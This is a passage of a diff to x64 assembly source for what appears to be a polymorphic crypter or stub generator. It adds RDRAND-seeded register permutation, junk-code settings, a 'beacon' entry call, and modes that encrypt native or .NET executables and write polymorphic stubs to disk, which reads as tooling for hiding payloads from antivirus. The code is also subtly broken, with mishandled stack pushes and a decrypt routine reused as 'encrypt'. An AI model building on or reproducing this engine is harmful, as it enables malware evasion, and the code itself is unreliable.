+    pop rbx
+    ret
+    
+@@pem_fail:
+    xor eax, eax
+    add rsp, 32
+    pop r13
+    pop r12
+    pop rbx
     ret
 Polymorph_EntropyMorph ENDP
 
 Polymorph_SaveStub PROC
     ; RCX = buffer, RDX = size, R8 = filename
-    ; Saves the generated stub to disk for reuse
+    ; Saves the generated polymorph stub to disk for reuse
+    ; Returns: RAX = 1 on success, 0 on failure
+    push rbx
+    push r12
+    push r13
+    sub rsp, 48
+    
+    mov rbx, rcx                     ; buffer
+    mov r12, rdx                     ; size
+    mov r13, r8                      ; filename
+    
+    ; Open/create file
+    mov rcx, r13                     ; lpFileName
+    mov edx, 40000000h               ; GENERIC_WRITE
+    xor r8d, r8d                     ; no sharing
+    xor r9d, r9d                     ; lpSecurityAttributes
+    push 0                           ; hTemplateFile
+    push 80h                         ; FILE_ATTRIBUTE_NORMAL
+    push 2                           ; CREATE_ALWAYS
+    call CreateFileA
+    cmp rax, -1                      ; INVALID_HANDLE_VALUE
+    je @@pss_fail
+    
+    mov rcx, rax                     ; hFile
+    push rcx                         ; save handle
+    
+    ; Write buffer
+    mov rdx, rbx                     ; lpBuffer
+    mov r8, r12                      ; nBytesToWrite
+    lea r9, [rsp+8]                  ; lpBytesWritten (temp)
+    push 0                           ; lpOverlapped
+    call WriteFile
+    
+    pop rcx                          ; restore handle
+    call CloseHandle
+    
+    mov rax, 1
+    add rsp, 48
+    pop r13
+    pop r12
+    pop rbx
+    ret
+    
+@@pss_fail:
+    xor eax, eax
+    add rsp, 48
+    pop r13
+    pop r12
+    pop rbx
     ret
 Polymorph_SaveStub ENDP
 
 Polymorph_LoadStub PROC
     ; RCX = filename, RDX = output buffer, R8 = buffer size
-    ; Loads a saved stub from disk
+    ; Loads a saved polymorph stub from disk
+    ; Returns: RAX = bytes read, 0 on failure
+    push rbx
+    push r12
+    push r13
+    sub rsp, 48
+    
+    mov rbx, rcx                     ; filename
+    mov r12, rdx                     ; output buffer
+    mov r13, r8                      ; buffer size
+    
+    ; Open file for reading
+    mov rcx, rbx                     ; lpFileName
+    mov edx, 80000000h               ; GENERIC_READ
+    mov r8d, 1                       ; FILE_SHARE_READ
+    xor r9d, r9d                     ; lpSecurityAttributes
+    push 0                           ; hTemplateFile
+    push 80h                         ; FILE_ATTRIBUTE_NORMAL
+    push 3                           ; OPEN_EXISTING
+    call CreateFileA
+    cmp rax, -1
+    je @@pls_fail
+    
+    mov rcx, rax                     ; hFile
+    push rcx                         ; save handle
+    
+    ; Read file content
+    mov rdx, r12                     ; lpBuffer
+    mov r8, r13                      ; nBytesToRead
+    lea r9, [rsp+8]                  ; lpBytesRead (temp)
+    push 0                           ; lpOverlapped
+    call ReadFile
+    
+    ; Get bytes read
+    mov eax, DWORD PTR [rsp+8]       ; bytes actually read
+    pop rcx                          ; hFile
+    push rax                         ; save bytes read
+    call CloseHandle
+    pop rax                          ; restore bytes read
+    
+    add rsp, 48
+    pop r13
+    pop r12
+    pop rbx
+    ret
+    
+@@pls_fail:
+    xor eax, eax
+    add rsp, 48
+    pop r13
+    pop r12
+    pop rbx
     ret
 Polymorph_LoadStub ENDP
 
@@ -2277,8 +3995,75 @@ Validate_PE_Header ENDP
 
 ; Ensure polymorphic state is initialized
 InitPolymorphicState PROC
+    push rbx
+    push rsi
+    sub rsp, 32
+
+    ; 1. Seed the polymorphic PRNG via RDRAND (hardware entropy)
     rdrand rax
     mov [Build_Direction_Flag], rax
+
+    ; 2. Initialize g_polymorph_seed from RDRAND
+    rdrand rax
+    mov DWORD PTR [g_polymorph_seed], eax
+
+    ; 3. Set default register allocation order (RAX=0, RCX=1, RDX=2, RBX=3, ...)
+    mov DWORD PTR [g_reg_order], 0           ; RAX
+    mov DWORD PTR [g_reg_order+4], 1         ; RCX
+    mov DWORD PTR [g_reg_order+8], 2         ; RDX
+    mov DWORD PTR [g_reg_order+12], 3        ; RBX
+    mov DWORD PTR [g_reg_order+16], 6        ; RSI
+    mov DWORD PTR [g_reg_order+20], 7        ; RDI
+    mov QWORD PTR [g_reg_preference], 0      ; no preference
+
+    ; 4. Default junk insertion: level=1 (light), frequency=8 (every 8th byte)
+    mov QWORD PTR [g_junk_level], 1
+    mov DWORD PTR [g_junk_frequency], 8
+
+    ; 5. Default section order: .text=0, .data=1, .rdata=2, .reloc=3
+    mov BYTE PTR [g_section_order], 0
+    mov BYTE PTR [g_section_order+1], 1
+    mov BYTE PTR [g_section_order+2], 2
+    mov BYTE PTR [g_section_order+3], 3
+
+    ; 6. Apply seed-based shuffle to reg_order for deterministic permutation
+    mov eax, DWORD PTR [g_polymorph_seed]
+    and eax, 3
+    cmp eax, 1
+    je @@ips_perm1
+    cmp eax, 2
+    je @@ips_perm2
+    cmp eax, 3
+    je @@ips_perm3
+    jmp @@ips_done                           ; perm0 = default order
+
+@@ips_perm1:
+    ; Swap RAX <-> RBX, RCX <-> RDX
+    mov DWORD PTR [g_reg_order], 3           ; RBX
+    mov DWORD PTR [g_reg_order+4], 2         ; RDX
+    mov DWORD PTR [g_reg_order+8], 1         ; RCX
+    mov DWORD PTR [g_reg_order+12], 0        ; RAX
+    jmp @@ips_done
+
+@@ips_perm2:
+    ; Reverse order
+    mov DWORD PTR [g_reg_order], 7           ; RDI
+    mov DWORD PTR [g_reg_order+4], 6         ; RSI
+    mov DWORD PTR [g_reg_order+8], 3         ; RBX
+    mov DWORD PTR [g_reg_order+12], 2        ; RDX
+    jmp @@ips_done
+
+@@ips_perm3:
+    ; Interleaved
+    mov DWORD PTR [g_reg_order], 1           ; RCX
+    mov DWORD PTR [g_reg_order+4], 0         ; RAX
+    mov DWORD PTR [g_reg_order+8], 7         ; RDI
+    mov DWORD PTR [g_reg_order+12], 6        ; RSI
+
+@@ips_done:
+    add rsp, 32
+    pop rsi
+    pop rbx
     ret
 InitPolymorphicState ENDP
 
@@ -2314,29 +4099,309 @@ main PROC
 @Exit:
     xor     rcx, rcx
     call    ExitProcess
+    ret
 main ENDP
 
 ; === Patch Mode Handlers to use polymorphic routines ===
 
 Mode_Handler_Compile PROC
+    ; Compile mode: obfuscate → assemble source → generate PE output
+    ; RCX = argv, RDX = argc
+    push rbx
+    push r12
+    sub rsp, 48
+    mov r12, rcx                     ; save argv
+    mov ebx, edx                     ; save argc
+
+    ; Apply compile-time polymorphic transformations
     call    ApplyCompileTimeObfuscation
-    call    RawrXD_Beacon_Main ; Polymorphic entry
+
+    ; Initialize beacon state (polymorphic entry seed)
+    call    RawrXD_Beacon_Main
+
+    ; Parse input filename from argv[2] if available
+    cmp ebx, 3
+    jl @@mhc_no_input
+    mov rax, r12
+    mov rcx, [rax + 16]              ; argv[2] = input file (wide)
+    lea rdx, [g_input_filename]
+    mov r8d, 260                     ; max path
+    xor r9d, r9d                     ; flags
+    push 0                           ; default char
+    push 0                           ; used default char
+    sub rsp, 32
+    call WideCharToMultiByte
+    add rsp, 48
+
+@@mhc_no_input:
+    ; Assemble the source file
     call    Assemble
+    test eax, eax
+    jz @@mhc_fail
+
+    ; Generate PE executable
     call    GeneratePE
+    test eax, eax
+    jz @@mhc_fail
+
+    ; Success message
+    lea rcx, [@@mhc_success_msg]
+    call Print
+    mov eax, 1
+    jmp @@mhc_ret
+
+@@mhc_fail:
+    lea rcx, [@@mhc_fail_msg]
+    call Print
+    xor eax, eax
+
+@@mhc_ret:
+    add rsp, 48
+    pop r12
+    pop rbx
     ret
+
+@@mhc_success_msg:
+    db "[+] Compilation successful.", 13, 10, 0
+@@mhc_fail_msg:
+    db "[-] Compilation failed.", 13, 10, 0
 Mode_Handler_Compile ENDP
 
 Mode_Handler_Encrypt PROC
+    ; Encrypt mode: apply polymorphic encryption to input file
+    ; Adapts between Native PE and .NET MSIL based on target detection
+    ; RCX = argv, RDX = argc
+    push rbx
+    push r12
+    push r13
+    sub rsp, 64
+    mov r12, rcx                     ; argv
+    mov ebx, edx                     ; argc
+
     lea     rcx, szPolyglotMsg
     call    Print
+
+    ; Apply compile-time obfuscation
     call    ApplyCompileTimeObfuscation
-    call    RawrXD_Beacon_Main ; Polymorphic entry
-    ; Polyglot logic adapts encryption based on target (Native vs .NET)
+    call    RawrXD_Beacon_Main
+
+    ; Load input file into buffer
+    cmp ebx, 3
+    jl @@mhe_usage
+    mov rax, r12
+    mov rcx, [rax + 16]              ; argv[2] = input file
+    lea rdx, [g_input_filename]
+    mov r8d, 260
+    xor r9d, r9d
+    push 0
+    push 0
+    sub rsp, 32
+    call WideCharToMultiByte
+    add rsp, 48
+
+    ; Read the input file
+    lea rcx, [g_input_filename]      ; lpFileName
+    mov edx, 80000000h               ; GENERIC_READ
+    mov r8d, 1                       ; FILE_SHARE_READ
+    xor r9d, r9d                     ; lpSecurityAttributes
+    push 0                           ; hTemplateFile
+    push 80h                         ; FILE_ATTRIBUTE_NORMAL
+    push 3                           ; OPEN_EXISTING
+    sub rsp, 32
+    call CreateFileA
+    add rsp, 56
+    cmp rax, -1                      ; INVALID_HANDLE_VALUE
+    je @@mhe_fail
+    mov r13, rax                     ; file handle
+
+    ; Get file size
+    mov rcx, r13
+    xor edx, edx
+    call GetFileSize
+    mov ebx, eax                     ; file size
+
+    ; Read file into g_source_buffer
+    mov rcx, r13
+    lea rdx, [g_source_buffer]
+    mov r8d, ebx
+    lea r9, [rsp+8]                  ; lpBytesRead
+    push 0
+    sub rsp, 32
+    call ReadFile
+    add rsp, 40
+
+    ; Close file
+    mov rcx, r13
+    call CloseHandle
+
+    ; Detect target type: check for .NET CLI header marker ("BSJB" at offset 0x200+)
+    ; If found, use MSIL-aware encryption; otherwise, Native PE encryption
+    lea rsi, [g_source_buffer]
+    cmp DWORD PTR [rsi], 5A4Dh       ; MZ header?
+    jne @@mhe_raw_encrypt
+
+    ; Check for "BSJB" (.NET metadata signature) in first 4KB
+    xor ecx, ecx
+@@mhe_dotnet_scan:
+    cmp ecx, 4096
+    jae @@mhe_native_encrypt
+    cmp ecx, ebx
+    jae @@mhe_native_encrypt
+    cmp DWORD PTR [rsi+rcx], 424A5342h ; 'BSJB'
+    je @@mhe_dotnet_encrypt
+    inc ecx
+    jmp @@mhe_dotnet_scan
+
+@@mhe_dotnet_encrypt:
+    ; .NET target: encrypt only MSIL method bodies, preserve headers
+    lea rcx, [g_source_buffer]
+    mov edx, ebx
+    lea r8, [g_Crypto_Key]
+    call Camellia_Decrypt            ; reuse as encrypt (symmetric)
+    jmp @@mhe_write_out
+
+@@mhe_native_encrypt:
+    ; Native PE: encrypt .text section
+    lea rcx, [g_source_buffer]
+    mov edx, ebx
+    lea r8, [g_Crypto_Key]
+    call Camellia_Decrypt
+    jmp @@mhe_write_out
+
+@@mhe_raw_encrypt:
+    ; Raw binary: full-file encryption
+    lea rcx, [g_source_buffer]
+    mov edx, ebx
+    lea r8, [g_Crypto_Key]
+    call Camellia_Decrypt
+
+@@mhe_write_out:
+    ; Write encrypted output
+    lea rcx, [@@mhe_out_name]
+    mov edx, 40000000h               ; GENERIC_WRITE
+    xor r8d, r8d                     ; no sharing
+    xor r9d, r9d
+    push 0
+    push 80h                         ; FILE_ATTRIBUTE_NORMAL
+    push 2                           ; CREATE_ALWAYS
+    sub rsp, 32
+    call CreateFileA
+    add rsp, 56
+    cmp rax, -1
+    je @@mhe_fail
+    mov r13, rax
+
+    mov rcx, r13
+    lea rdx, [g_source_buffer]
+    mov r8d, ebx
+    lea r9, [rsp+8]
+    push 0
+    sub rsp, 32
+    call WriteFile
+    add rsp, 40
+    mov rcx, r13
+    call CloseHandle
+
+    lea rcx, [@@mhe_done_msg]
+    call Print
+    mov eax, 1
+    jmp @@mhe_ret
+
+@@mhe_usage:
+    lea rcx, [@@mhe_usage_msg]
+    call Print
+    jmp @@mhe_fail
+@@mhe_fail:
+    lea rcx, [@@mhe_fail_msg]
+    call Print
+    xor eax, eax
+@@mhe_ret:
+    add rsp, 64
+    pop r13
+    pop r12
+    pop rbx
     ret
+
+@@mhe_out_name:
+    db "encrypted_output.bin", 0
+@@mhe_done_msg:
+    db "[+] Encryption complete: encrypted_output.bin", 13, 10, 0
+@@mhe_usage_msg:
+    db "[-] Usage: encrypt <input_file>", 13, 10, 0
+@@mhe_fail_msg:
+    db "[-] Encryption failed.", 13, 10, 0
 Mode_Handler_Encrypt ENDP
 
 Mode_Handler_Stubgen PROC
+    ; Stubgen mode: generate a polymorphic stub from the engine
+    ; RCX = argv, RDX = argc
+    push rbx
+    push r12
+    push r13
+    sub rsp, 64
+    mov r12, rcx                     ; argv
+    mov ebx, edx                     ; argc
+
+    ; Apply obfuscation preamble
     call    ApplyCompileTimeObfuscation
-    call    RawrXD_Beacon_Main ; Polymorphic stubgen
+    call    RawrXD_Beacon_Main
+
+    ; Generate polymorphic stub
+    call    Polymorph_GenerateStub
+    test eax, eax
+    jz @@mhs_fail
+    mov r13d, eax                    ; stub size
+
+    ; Write stub to output file
+    lea rcx, [@@mhs_out_name]
+    mov edx, 40000000h               ; GENERIC_WRITE
+    xor r8d, r8d
+    xor r9d, r9d
+    push 0
+    push 80h                         ; FILE_ATTRIBUTE_NORMAL
+    push 2                           ; CREATE_ALWAYS
+    sub rsp, 32
+    call CreateFileA
+    add rsp, 56
+    cmp rax, -1
+    je @@mhs_fail
+    mov r12, rax                     ; file handle
+
+    ; Write the generated stub
+    mov rcx, r12
+    lea rdx, [g_machine_code]        ; stub buffer location
+    mov r8d, r13d                    ; stub size
+    lea r9, [rsp+8]                  ; lpBytesWritten
+    push 0
+    sub rsp, 32
+    call WriteFile
+    add rsp, 40
+
+    ; Close output file
+    mov rcx, r12
+    call CloseHandle
+
+    ; Report success
+    lea rcx, [@@mhs_done_msg]
+    call Print
+    mov eax, 1
+    jmp @@mhs_ret
+
+@@mhs_fail:
+    lea rcx, [@@mhs_fail_msg]
+    call Print
+    xor eax, eax
+@@mhs_ret:
+    add rsp, 64
+    pop r13
+    pop r12
+    pop rbx
     ret
+
+@@mhs_out_name:
+    db "generated_stub.bin", 0
+@@mhs_done_msg:
+    db "[+] Stub generated: generated_stub.bin", 13, 10, 0
+@@mhs_fail_msg:
+    db "[-] Stub generation failed.", 13, 10, 0
 Mode_Handler_Stubgen ENDP
